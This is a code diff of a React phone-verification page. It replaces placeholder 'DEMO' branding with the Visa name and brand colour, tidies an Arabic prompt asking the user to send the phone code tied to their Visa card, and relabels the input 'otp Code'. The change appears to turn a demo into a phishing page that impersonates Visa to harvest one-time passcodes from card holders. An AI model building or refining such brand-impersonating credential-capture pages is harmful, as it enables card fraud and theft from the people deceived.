@@ -1388,7 +1388,7 @@ export default function VerifyPhonePage() {
           {/* Header */}
           <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
             <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
-              DEMO
+              visa
             </div>
           </header>
         </>
@@ -1524,15 +1524,15 @@ export default function VerifyPhonePage() {
             </div>
 
             <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
-              ه. من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا .
+              . من فضلك ارسل رمز الهاتف المرتبط بهذه الفيزا.
               <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
-                DEMO •••• 0000
+                 •••• 0000
               </span>
             </div>
 
             <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
               <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
-                Demo Code
+                otp Code
               </label>
 
               <input
